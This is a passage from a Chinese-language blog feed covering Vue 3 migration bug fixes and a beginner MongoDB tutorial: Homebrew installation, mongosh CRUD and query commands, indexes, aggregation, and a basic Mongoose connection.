<li><a href="https://v3-migration.vuejs.org/breaking-changes/filters.html#_2-x-syntax">&#x79FB;&#x9664;&#x8FC7;&#x6EE4;&#x5668;</a> =&gt; &#x901A;&#x8FC7; methods &#x548C; computed &#x4E5F;&#x53EF;&#x5B9E;&#x73B0;</li>
</ul>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="bugs-%E8%A7%A3%E5%86%B3">Bugs &#x89E3;&#x51B3;</h2>
<ul>
<li>Uncaught TypeError: app.mount(...).use is not a function</li>
</ul>
<p>main.js &#x4E2D;&#x5B9E;&#x4F8B;&#x7684;&#x4F7F;&#x7528;&#x987A;&#x5E8F;&#x662F;&#xFF0C;&#x5148;&#x8C03;&#x7528; <code>createApp()</code> &#x521B;&#x5EFA;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5B9E;&#x4F8B;&#xFF1B;&#x518D;&#x4F7F;&#x7528; <code>app.use()</code> &#x5B89;&#x88C5;&#x63D2;&#x4EF6;&#xFF1B;&#x6700;&#x540E;&#x5C06;&#x5E94;&#x7528;&#x5B9E;&#x4F8B;&#x6302;&#x8F7D;&#x4E8E;&#x5BB9;&#x5668;&#x5143;&#x7D20; <code>app.mount()</code>&#x3002;</p>
<pre><code class="language-javascript">const app = createApp(App)
// &#x91CD;&#x70B9;&#x6CE8;&#x610F;&#x94FE;&#x5F0F;&#x8C03;&#x7528;&#x987A;&#x5E8F;
app.use(store).use(router).use(ElementPlus).mount(&apos;#app&apos;);
</code></pre>
<ul>
<li>Error: Cannot find module &apos;unplugin-vue-components/resolvers&apos;</li>
</ul>
<p>Vue3 &#x9879;&#x76EE;&#x4E0B;&#x6309;&#x9700;&#x5F15;&#x5165; Vant &#x65F6;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#xFF0C;&#x6A21;&#x5757;&#x672A;&#x627E;&#x5230;&#x5728; node_modules &#x4E2D;&#x627E;&#x5230;&#x3002;</p>
<p>&#x5220;&#x9664; Vant &#x4F9D;&#x8D56;&#x540E;&#x91CD;&#x65B0;&#x4E0B;&#x8F7D;&#x65E0;&#x6CD5;&#x89E3;&#x51B3;&#x3002;</p>
<p><a href="https://www.npmjs.com/package/unplugin-vue-components">unplugin-vue-components/resolvers</a> &#x6307;&#x5B9A;&#x5E93;&#x5728; 22-07-10 &#x52A0;&#x5165; npm&#x3002;</p>
<pre><code class="language-shell"># &#x89E3;&#x51B3;&#x65B9;&#x5F0F;
yarn add unplugin-vue-components
</code></pre>
<ul>
<li>[Vue warn]: Component &lt;Anonymous&gt;: setup function returned a promise, but no &lt;Suspense&gt; boundary was found in the parent component tree. A component with async setup() must be nested in a &lt;Suspense&gt; in order to be rendered. at Xxx.</li>
</ul>
<p>&#x95EE;&#x9898;&#x51FA;&#x73B0; =&gt; &#x5728; async setup &#x7684;&#x7EC4;&#x4EF6;&#x4E2D;&#x83B7;&#x53D6;&#x6570;&#x636E;&#xFF0C;&#x8FD0;&#x884C;&#x9879;&#x76EE;&#x65F6;&#x9875;&#x9762;&#x7A7A;&#x767D;&#x3002;</p>
<p>&#x89E3;&#x51B3;&#x65B9;&#x5F0F; =&gt; &#x9700;&#x8981;&#x5728;&#x7236;&#x8282;&#x70B9;&#x4E2D;&#x52A0;&#x4E0A; Suspense &#x7EC4;&#x4EF6;&#x3002;</p>
<ul>
<li>
<p>[Vue warn]: Property &quot;xxx&quot; was accessed during render but is not defined on instance. at &lt;ComponentXXX&gt; =&gt; &#x5728; setup &#x5B9A;&#x4E49;&#x7684;&#x6570;&#x636E;&#x5E76;&#x672A;&#x8FD4;&#x56DE;</p>
</li>
<li>
<p>Vue3 &#x4E2D;&#x4E0D;&#x652F;&#x6301; Vue2 &#x7684; .sync &#x8BED;&#x6CD5;&#x7CD6; =&gt; <a href="https://v3-migration.vuejs.org/breaking-changes/v-model.html">&#x70B9;&#x6B64;</a></p>
</li>
</ul>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[MongoDB]]></title><description><![CDATA[NoSQL => 文档数据库 MongoDB => 27017]]></description><link>yourdomain.com/mongodb/</link><guid isPermaLink="false">611e8b4a0de60f0cb667f229</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Thu, 20 May 2021 14:52:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2021/08/mongodb.jpg" medium="image"/><content:encoded><![CDATA[<img src="yourdomain.com/content/images/2021/08/mongodb.jpg" alt="MongoDB"><p></p><!--kg-card-begin: markdown--><h2 id="%E5%88%9D%E8%AF%86">&#x521D;&#x8BC6;</h2>
<p>MongoDB@3.2 &#x540E;&#x5B58;&#x5728;&#x8F83;&#x5927;&#x6539;&#x52A8;&#xFF0C;&#x4F7F;&#x7528;&#x65F6;&#x63A8;&#x8350;<a href="https://docs.mongoing.com/">&#x5B98;&#x65B9;&#x4E2D;&#x6587;&#x6587;&#x6863;</a>&#x3002;</p>
<p>&#x5B89;&#x88C5; MongoDB 5.0 &#x793E;&#x533A;&#x7248;&#xFF08;&#x5148;&#x51B3;&#x6761;&#x4EF6;&#xFF1A;Xcode &#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;&#x3001;Homebrew&#xFF09;&#xFF1A;</p>
<ul>
<li>&#x4E0B;&#x8F7D; MongoDB &#x548C;&#x6570;&#x636E;&#x5E93;&#x5DE5;&#x5177;&#x5E76;&#x5B89;&#x88C5;</li>
</ul>
<pre><code class="language-shell"># tap &#x547D;&#x4EE4;&#x5141;&#x8BB8; Homebrew &#x8FDB;&#x5165;&#x53E6;&#x4E00;&#x4E2A;&#x516C;&#x5F0F;&#x5B58;&#x50A8;&#x5E93;. &#x5B8C;&#x6210;&#x6B64;&#x64CD;&#x4F5C;&#x5219;&#x6269;&#x5C55;&#x53EF;&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#x7684;&#x9009;&#x9879;
brew tap mongodb/brew
# &#x5B89;&#x88C5;
brew install mongodb-community@5.0
</code></pre>
<p>&#x5B89;&#x88C5;&#x4F1A;&#x5728;&#x4EE5;&#x4E0B;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#x548C;&#x76EE;&#x5F55;&#xFF0C;&#x5177;&#x4F53;&#x53D6;&#x51B3;&#x4E8E; Apple &#x786C;&#x4EF6;&#xFF1A;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: html--><table border="1">
    <tr>
        <th>  </th>
        <th> &#x82F1;&#x7279;&#x5C14;&#x5904;&#x7406;&#x5668; </th>
        <th> M1&#x5904;&#x7406;&#x5668; </th>
    </tr>
    <tbody style="text-align:center">
    <tr>
        <td> &#x914D;&#x7F6E;&#x6587;&#x4EF6; </td>
        <td> /usr/local/etc/mongod.conf </td>
        <td> /opt/homebrew/etc/mongod.conf </td>
    </tr>
    <tr>
        <td> log directory </td>
        <td> /usr/local/var/log/mongodb </td>
        <td> /opt/homebrew/var/log/mongodb </td>
    </tr>
    <tr>
        <td> data directory </td>
        <td> /usr/local/var/mongodb </td>
        <td> /opt/homebrew/var/mongodb </td>
    </tr>
    </tbody>
</table><!--kg-card-end: html--><!--kg-card-begin: markdown--><ul>
<li>&#x57FA;&#x672C;&#x64CD;&#x4F5C;</li>
</ul>
<pre><code class="language-sql"># &#x5C06; MongoDB(&#x5373;mongod&#x8FDB;&#x7A0B;)&#x4F5C;&#x4E3A; macOS &#x670D;&#x52A1;&#x8FD0;&#x884C;|&#x505C;&#x6B62;
brew services start|stop mongodb-community@5.0
# &#x9A8C;&#x8BC1;&#x662F;&#x5426;&#x6B63;&#x5728;&#x8FD0;&#x884C;
brew services list
# &#x8FDE;&#x63A5;&#x548C;&#x4F7F;&#x7528; MongoDB
mongosh
# &#x5C55;&#x793A;&#x6570;&#x636E;&#x5E93;
show databases; # &#x6216;&#x8005; show dbs;
# &#x663E;&#x793A;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;
db
# &#x67E5;&#x770B;&#x7248;&#x672C;&#x4FE1;&#x606F;
db.version();
# &#x9009;&#x4E2D;&#x6570;&#x636E;&#x5E93;
use $yourdatabase; # &#x5982;&#x679C;&#x6CA1;&#x6709;&#x4F1A;&#x9690;&#x5F0F;&#x521B;&#x5EFA;
# &#x67E5;&#x770B;&#x8868;(&#x96C6;&#x5408;)
show tables; # &#x56E0;&#x4E3A;&#x5E76;&#x975E;&#x591A;&#x884C;&#x591A;&#x5217;,&#x53EB;&#x8868;&#x4E0D;&#x5408;&#x9002;
show collections; &#x2714;&#xFE0F;
# &#x521B;&#x5EFA;&#x96C6;&#x5408;
db.createCollection(&quot;necessities&quot;); # { ok: 1 }
# &#x5220;&#x9664;&#x96C6;&#x5408;
db.collectionName.drop(); # true
# &#x5220;&#x9664;&#x6570;&#x636E;&#x5E93;
db.dropDatabase(); # &#x5220;&#x9664;&#x5F53;&#x524D;&#x9009;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;
# &#x63D2;&#x5165; JSON &#x6570;&#x636E;
db.necessities.insert({&quot;name&quot;:&quot;Dryer&quot;,&quot;origin&quot;:&quot;San Antonio&quot;}); # &#x274C; DeprecationWarning: Collection.insert() is deprecated. Use insertOne, insertMany, or bulkWrite. 
# 3.2 &#x7248;&#x672C;&#x4E4B;&#x540E;&#x65B0;&#x589E;&#x4E86; db.collection.insertOne() &#x548C; db.collection.insertMany()
db.necessities.insertOne({&quot;name&quot;:&quot;Dryer&quot;,&quot;origin&quot;:&quot;San Antonio&quot;}); # &#x2714;&#xFE0F;
db.necessities.insertMany([{&quot;_id&quot;:&quot;612e26f5d5f808a806f499e6&quot;,&quot;name&quot;:&quot;dryer&quot;,&quot;origin&quot;:&quot;San Antonio&quot;},{&quot;_id&quot;:&quot;612e27b6d5f808a806f499e8&quot;,&quot;name&quot;:&quot;charger&quot;,&quot;origin&quot;:&quot;San Diego&quot;},{&quot;_id&quot;:&quot;612e2e03d5f808a806f499e9&quot;,&quot;name&quot;:&quot;conditioner&quot;,&quot;origin&quot;:&quot;Seattle&quot;},{&quot;_id&quot;:&quot;612e3737d5f808a806f499ea&quot;,&quot;name&quot;:&quot;waitforremove&quot;,&quot;origin&quot;:&quot;zsxzy&quot;}]);
</code></pre>
<!--kg-card-end: markdown--><figure class="kg-card kg-image-card kg-card-hascaption"><img src="yourdomain.com/content/images/2021/08/insertMany.png" class="kg-image" alt="MongoDB" loading="lazy" width="1296" height="572" srcset="yourdomain.com/content/images/size/w600/2021/08/insertMany.png 600w, yourdomain.com/content/images/size/w1000/2021/08/insertMany.png 1000w, yourdomain.com/content/images/2021/08/insertMany.png 1296w" sizes="(min-width: 720px) 720px"><figcaption>insertMany</figcaption></figure><!--kg-card-begin: markdown--><pre><code class="language-sql"># &#x67E5;&#x8BE2;&#x96C6;&#x5408;&#x6570;&#x636E; &#x2014;&#x2014; $currentDB.currentCollection.find(query, projection) 
# query(&#x53EF;&#x9009;):&#x4F7F;&#x7528;&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;&#x7B26;&#x6307;&#x5B9A;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;;projection(&#x53EF;&#x9009;):&#x4F7F;&#x7528;&#x6295;&#x5F71;&#x64CD;&#x4F5C;&#x7B26;&#x6307;&#x5B9A;&#x8FD4;&#x56DE;&#x7684;&#x952E;
db.necessities.findOne()|find()|find().count(); # &#x67E5;&#x770B;&#x4E00;&#x4E2A;&#x6587;&#x6863;|&#x6700;&#x591A;20&#x4E2A;&#x5339;&#x914D;&#x7684;&#x6587;&#x6863;|&#x67E5;&#x770B;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x6587;&#x6863;&#x6570;&#x91CF;
# &#x79FB;&#x9664;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x6570;&#x636E;
db.necessities.deleteOne({&quot;name&quot;:&quot;waitforremove&quot;});
# &#x66F4;&#x65B0;&#x96C6;&#x5408;&#x6570;&#x636E;
# &#x5982;&#x679C;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x672A;&#x8BBE;&#x7F6E; $set &#x5219;&#x4F1A;&#x62A5;&#x9519; TypeError: Update document requires atomic operators
db.necessities.updateOne({&quot;_id&quot;:&quot;612e3737d5f808a806f499ea&quot;,&quot;name&quot;:&quot;waitforremove&quot;,&quot;origin&quot;:&quot;zsxzy&quot;},{$set:{&quot;name&quot;:&quot;toytoytoy&quot;}});
</code></pre>
<p>&#x67E5;&#x8BE2;&#x5C06;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x6E38;&#x6807;&#xFF0C;&#x6E38;&#x6807;&#x53EA;&#x4F1A;&#x5728;&#x9700;&#x8981;&#x65F6;&#x624D;&#x5C06;&#x9700;&#x8981;&#x7684;&#x6587;&#x6863;&#x6279;&#x91CF;&#x8FD4;&#x56DE;&#xFF1B;&#x6E38;&#x6807; (cursor) &#x4E0D;&#x662F;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#xFF0C;&#x800C;&#x662F;&#x67E5;&#x8BE2;&#x7684;&#x8FD4;&#x56DE;&#x8D44;&#x6E90;&#x6216;&#x8005;&#x63A5;&#x53E3;&#x3002;</p>
<p>&#x901A;&#x5E38;&#x6587;&#x6863;&#x53EA;&#x4F1A;&#x90E8;&#x5206;&#x66F4;&#x65B0;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x539F;&#x5B50;&#x6027;&#x7684;&#x66F4;&#x65B0;&#x4FEE;&#x6539;&#x5668;&#xFF08;update modifier&#xFF09;&#xFF0C;&#x6307;&#x5B9A;&#x5BF9;&#x6587;&#x6863;&#x4E2D;&#x7684;&#x67D0;&#x4E9B;&#x5B57;&#x6BB5;&#x8FDB;&#x884C;&#x66F4;&#x65B0;&#x3002;&#x66F4;&#x65B0;&#x4FEE;&#x6539;&#x5668;&#x662F;&#x79CD;&#x7279;&#x6B8A;&#x7684;&#x952E;&#xFF0C;&#x7528;&#x6765;&#x6307;&#x5B9A;&#x590D;&#x6742;&#x7684;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#xFF0C;&#x6BD4;&#x5982;&#x4FEE;&#x6539;&#x3001;&#x589E;&#x52A0;&#x6216;&#x8005;&#x5220;&#x9664;&#x952E;&#xFF0C;&#x8FD8;&#x53EF;&#x80FD;&#x662F;&#x64CD;&#x4F5C;&#x6570;&#x7EC4;&#x6216;&#x8005;&#x5185;&#x5D4C;&#x6587;&#x6863;&#x3002;</p>
<p>&#x5047;&#x8BBE;&#x8981;&#x5728;&#x4E00;&#x4E2A;&#x96C6;&#x5408;&#x4E2D;&#x653E;&#x7F6E;&#x7F51;&#x7AD9;&#x7684;&#x5206;&#x6790;&#x6570;&#x636E;&#xFF0C;&#x53EA;&#x8981;&#x6709;&#x4EBA;&#x8BBF;&#x95EE;&#x9875;&#x9762;&#xFF0C;&#x5C31;&#x589E;&#x52A0;&#x8BA1;&#x6570;&#x5668;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x66F4;&#x65B0;&#x4FEE;&#x6539;&#x5668;&#x539F;&#x5B50;&#x6027;&#x5730;&#x5B8C;&#x6210;&#x8FD9;&#x4E2A;&#x589E;&#x52A0;&#x3002;&#x6BCF;&#x4E2A; URL &#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x8BBF;&#x95EE;&#x6B21;&#x6570;&#x90FD;&#x4EE5;&#x5982;&#x4E0B;&#x65B9;&#x5F0F;&#x5B58;&#x50A8;&#x5728;&#x6587;&#x6863;&#x4E2D;&#xFF1A;</p>
<pre><code class="language-javascript">{
    &quot;_id&quot; : ObjectId(&quot;4 &#x5B57;&#x8282;&#x7684;&#x65F6;&#x95F4;&#x6233; 5 &#x5B57;&#x8282;&#x7684;&#x968F;&#x673A;&#x503C; 3 &#x5B57;&#x8282;&#x9012;&#x589E;&#x8BA1;&#x6570;&#x5668;&quot;),&#xFFFC;
    &quot;url&quot; : &quot;www.zstheyi.com&quot;,
    &quot;pageviews&quot; : 422
}
</code></pre>
<p>&#x6BCF;&#x6B21;&#x6709;&#x4EBA;&#x8BBF;&#x95EE;&#x9875;&#x9762;&#xFF0C;&#x5C31;&#x901A;&#x8FC7;URL&#x627E;&#x5230;&#x8BE5;&#x9875;&#x9762;&#xFF0C;&#x5E76;&#x7528; $inc &#x4FEE;&#x6539;&#x5668;&#x589E;&#x52A0; pageviews &#x7684;&#x503C;&#x3002;&#x4F7F;&#x7528;&#x4FEE;&#x6539;&#x5668;&#x65F6;&#xFF0C;_id &#x7684;&#x503C;&#x4E0D;&#x80FD;&#x6539;&#x53D8;&#x3002;</p>
<p>$set &#x7528;&#x6765;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x3002;&#x5982;&#x679C;&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x5219;&#x521B;&#x5EFA;&#x5B83;&#x3002;&#x5E38;&#x7528;&#x4E8E;&#x66F4;&#x65B0;&#x6216;&#x8005;&#x589E;&#x52A0;&#x6587;&#x6863;&#x3002;&#x5220;&#x9664;&#x53EF;&#x4EE5;&#x7528; $unset &#x5B8C;&#x5168;&#x5220;&#x9664;&#x952E;&#x3002;&#x5728;&#x6570;&#x7EC4;&#x4FEE;&#x6539;&#x5668;&#x4E2D;&#xFF0C;$push &#x4F1A;&#x5411;&#x5DF2;&#x6709;&#x7684;&#x6570;&#x7EC4;&#x672B;&#x5C3E;&#x52A0;&#x5165;&#x5143;&#x7D20;&#xFF0C;&#x8981;&#x662F;&#x6CA1;&#x6709;&#x5C31;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4E0E; $each &#x7EC4;&#x5408;&#x4E00;&#x6B21;&#x6DFB;&#x52A0;&#x591A;&#x4E2A;&#x503C;&#x3002;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x6570;&#x7EC4;&#x5185;&#x5143;&#x7D20;&#x4E0D;&#x91CD;&#x590D;&#xFF0C;$addToSet &#x4E0E; $ne &#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x96C6;&#x5408;&#x6570;&#x636E;&#x3002;$pop &#x8FD9;&#x4E2A;&#x4FEE;&#x6539;&#x5668;&#x6839;&#x636E;&#x4F20;&#x5165;&#x7684; key &#x4ECE;&#x6570;&#x7EC4;&#x4EFB;&#x4F55;&#x4E00;&#x7AEF;&#x5220;&#x9664;&#x5143;&#x7D20;&#x3002;$pull &#x4F1A;&#x5C06;&#x6240;&#x6709;&#x5339;&#x914D;&#x7684;&#x6587;&#x6863;&#x5220;&#x9664;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x53EA;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code class="language-sql"># &#x6761;&#x4EF6;&#x64CD;&#x4F5C;&#x7B26; &#x2014;&#x2014; $gt (&gt;), $gte (&gt;=), $in (&#x5305;&#x542B;), $lt (&lt;), $lte (&lt;=), $ne (!=), $nin(&#x4E0D;&#x5305;&#x542B;)&#x3001;$and (&amp;&amp;), $nor(&#x4E0D;&#x7B26;&#x5408;), $not(&#x4E0D;&#x5305;&#x542B;), $or (||)
db.necessities.find({&quot;name&quot;:&quot;dryer&quot;,&quot;origin&quot;:&quot;San Diego&quot;}).pretty(); 
db.necessities.find({$or:[{&quot;name&quot;:&quot;dryer&quot;},{&quot;origin&quot;:&quot;San Diego&quot;}]}).pretty(); # OR &#x6761;&#x4EF6;
db.necessities.find({&quot;price&quot;:{$gt:&quot;1&quot;}})|find({&quot;_id&quot;:{$gt:&quot;1&quot;}})

# $type&#x952E;&#x7C7B;&#x578B;&#x64CD;&#x4F5C;&#x7B26;
db.necessities.find({&quot;name&quot;:{$type:&quot;string&quot;}}) # &#x7B5B;&#x9009;&#x51FA;&#x6307;&#x5B9A;&#x7C7B;&#x578B;&#x952E;&#x7684;&#x6570;&#x636E;

# Limit &#x4E0E; Skip &#x65B9;&#x6CD5;
db.necessities.find().limit(2) # &#x663E;&#x793A;&#x4E24;&#x6761;&#x6587;&#x6863;
db.necessities.find().skip(4) # &#x8DF3;&#x8FC7;&#x6307;&#x5B9A;&#x6570;&#x91CF;&#x7684;&#x6570;&#x636E;

# &#x6392;&#x5E8F;&#x64CD;&#x4F5C; &#x2014;&#x2014; db.COLLECTION_NAME.find().sort({KEY:1})
db.necessities.find().sort({&quot;price&quot;:&quot;1&quot;}) # 1&#x4E3A;&#x7531;&#x5C0F;&#x5230;&#x5927;&#xFF0C;-1&#x4E3A;&#x7531;&#x5927;&#x5230;&#x5C0F;

# &#x7D22;&#x5F15;&#x64CD;&#x4F5C;
db.necessities.createIndex({&quot;price&quot;:1}) # &#x521B;&#x5EFA;&#x7D22;&#x5F15;
db.necessities.getIndexes() # &#x67E5;&#x770B;&#x7D22;&#x5F15;
db.necessities.totalIndexSize() # &#x67E5;&#x770B;&#x96C6;&#x5408;&#x7D22;&#x5F15;&#x5927;&#x5C0F;
db.necessities.dropIndexes() # &#x5220;&#x9664;&#x96C6;&#x5408;&#x6240;&#x6709;&#x7D22;&#x5F15;
db.necessities.dropIndex(&quot;price&quot;) # &#x5220;&#x9664;&#x96C6;&#x5408;&#x6307;&#x5B9A;&#x7D22;&#x5F15;

# &#x805A;&#x5408;(aggregate) &#x2014;&#x2014; &#x4E3B;&#x8981;&#x7528;&#x4E8E;&#x5904;&#x7406;&#x6570;&#x636E;(&#x8BF8;&#x5982;&#x7EDF;&#x8BA1;&#x5E73;&#x5747;&#x503C;&#xFF0C;&#x6C42;&#x548C;&#x7B49;),&#x5E76;&#x8FD4;&#x56DE;&#x8BA1;&#x7B97;&#x540E;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x679C;
db.necessities.aggregate([{$group:{_id:&quot;$origin&quot;,total:{$sum:&quot;$price&quot;}}}]) # &#x901A;&#x8FC7;&#x5B57;&#x6BB5; origin &#x5B57;&#x6BB5;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5206;&#x7EC4;&#xFF0C;&#x5E76;&#x8BA1;&#x7B97; price &#x5B57;&#x6BB5;&#x76F8;&#x540C;&#x503C;&#x7684;&#x603B;&#x548C;
</code></pre>
<p>&#x63D2;&#x5165;&#x6587;&#x6863;&#x6570;&#x636E;&#x4E0D;&#x80FD;&#x4F7F;&#x7528; db.$yourcollection.insert() &#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x662F;&#x9700;&#x8981;&#x91C7;&#x53D6; insertOne() &#x6216;&#x8005; insertMany()&#x3002;&#x66F4;&#x65B0;&#x6587;&#x6863;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x4F7F;&#x7528; replaceOne()&#xFF0C;&#x53EA;&#x80FD;&#x66FF;&#x6362;&#x6574;&#x4E2A;&#x6587;&#x6863;&#xFF1B;&#x800C; updateOne() &#x5219;&#x5141;&#x8BB8;&#x66F4;&#x65B0;&#x5B57;&#x6BB5;&#xFF0C;&#x540C;&#x65F6;&#x8FD8;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE; update operators &#x5BF9;&#x6587;&#x6863;&#x8FDB;&#x884C;&#x53EF;&#x9760;&#x66F4;&#x65B0;&#x3002;&#x79FB;&#x9664;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4E0D;&#x518D;&#x4F7F;&#x7528; remove()&#xFF0C;&#x800C;&#x6539;&#x7528; deleteOne, deleteMany, findOneAndDelete &#x6216; bulkWrite&#x3002;</p>
<ul>
<li>&#x5728; Navicat Premium &#x8FDE;&#x63A5; MongoDB</li>
</ul>
<p>&#x5728; connection &#x9009;&#x62E9;&#x5BF9;&#x5E94;&#x6570;&#x636E;&#x5E93;&#x540E;&#xFF0C;&#x6309;&#x7167;&#x9ED8;&#x8BA4;&#x89C4;&#x5219;&#x8FDE;&#x63A5;&#x5373;&#x53EF;&#xFF0C;&#x8FDE;&#x63A5;&#x7684;&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#x4E3A; 27017&#x3002;&#x5728;&#x5DE5;&#x5177;&#x680F;&#x7684; View &#x9009;&#x62E9; Show Hidden Items &#x53EF;&#x5C55;&#x793A;&#x9690;&#x85CF;&#x521D;&#x59CB;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF1A;admin&#x3001;config&#x3001;local&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="mongoose">Mongoose</h2>
<p>Mongoose &#x662F;&#x4E00;&#x4E2A; NodeJS &#x4E13;&#x95E8;&#x7528;&#x4E8E;&#x64CD;&#x4F5C; mongodb &#x6570;&#x636E;&#x5E93;&#x7684;&#x6A21;&#x5757;&#xFF0C;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x5728;&#x5F02;&#x6B65;&#x73AF;&#x5883;&#x4E2D;&#x5DE5;&#x4F5C;&#xFF0C;&#x652F;&#x6301; promise &#x548C;&#x5F02;&#x6B65;&#x56DE;&#x8C03;&#x7684;&#x5BF9;&#x8C61;&#x6587;&#x6863;&#x6A21;&#x578B;&#x5E93;&#x3002;Mongoose &#x53EF;&#x4EE5;&#x4E3A;&#x6587;&#x6863;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6A21;&#x5F0F;&#x7ED3;&#x6784; (Schema|&#x7EA6;&#x675F;)&#xFF0C;&#x5E76;&#x5BF9;&#x6A21;&#x578B;&#x4E2D;&#x7684;&#x5BF9;&#x8C61;/&#x6587;&#x6863;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;&#xFF0C;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7C7B;&#x578B;&#x8F6C;&#x6362;&#x4E3A;&#x5BF9;&#x8C61;&#x6A21;&#x578B;&#xFF0C;&#x4EE5;&#x53CA;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E2D;&#x95F4;&#x4EF6;&#x6765;&#x5E94;&#x7528;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x6302;&#x94A9;&#xFF0C;&#x6BD4;&#x8F83;&#x539F;&#x751F;&#x7684; MongoDB &#x9A71;&#x52A8;&#x66F4;&#x5BB9;&#x6613;&#xFF08;&#x8FDB;&#x4E00;&#x6B65;&#x5C01;&#x88C5;&#xFF09;&#x3002;</p>
<table>
    <thead style="font-weight:bold">
        <tr>
            <th>mongoose&#x5BF9;&#x8C61;</th>
            <th>&#x4F5C;&#x7528;&#x63CF;&#x8FF0;</th>
        </tr>
    </thead>
    <tbody style="text-align:center">
        <tr>
            <td>Schema</td>
            <td>&#x6A21;&#x5F0F;&#x5BF9;&#x8C61;&#x5B9A;&#x4E49;&#x7EA6;&#x675F;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x6587;&#x6863;&#x7ED3;&#x6784;</td>
        </tr>
        <tr>
            <td>Model</td>
            <td>Model &#x5BF9;&#x8C61;&#x4F5C;&#x4E3A;&#x6240;&#x6709;&#x6587;&#x6863;&#x7684;&#x8868;&#x793A;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x96C6;&#x5408; collection</td>
        </tr>
        <tr>
            <td>Document</td>
            <td>&#x8868;&#x793A;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x5177;&#x4F53;&#x6587;&#x6863;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x5177;&#x4F53;&#x6587;&#x6863;</td>
        </tr>
    </tbody>
</table>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D; mongoose &#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;
npm init -y
npm i mongoose --save
</code></pre>
<pre><code class="language-javascript">// &#x57FA;&#x672C;&#x8FDE;&#x63A5;
// &#x9879;&#x76EE;&#x5F15;&#x5165;mongoose
var mongoose = require(&apos;mongoose&apos;);
// &#x8FDE;&#x63A5; mongodb &#x2014;&#x2014; &#x9664;&#x975E;&#x9879;&#x76EE;&#x505C;&#x6B62;,&#x670D;&#x52A1;&#x5668;&#x5173;&#x95ED;,&#x5426;&#x5219;&#x8FDE;&#x63A5;&#x4E00;&#x822C;&#x4E0D;&#x4F1A;&#x65AD;&#x5F00;
mongoose.connect(&apos;mongodb://localhost:27017/&#x6570;&#x636E;&#x5E93;&#x540D;&apos;);
